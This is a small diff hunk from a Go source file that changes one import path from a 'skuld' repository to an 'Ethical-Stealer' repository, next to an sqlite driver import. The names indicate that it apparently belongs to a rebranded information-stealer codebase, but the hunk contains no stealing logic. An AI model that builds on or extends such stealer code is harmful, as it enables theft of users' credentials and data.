@@ -8,7 +8,7 @@ import (
 	"os"
 	"path/filepath"
 
-	"github.com/hackirby/skuld/utils/fileutil"
+	"github.com/opiumsoftware/Ethical-Stealer/ethicalstealer/utils/fileutil"
 	_ "modernc.org/sqlite"
 )
 
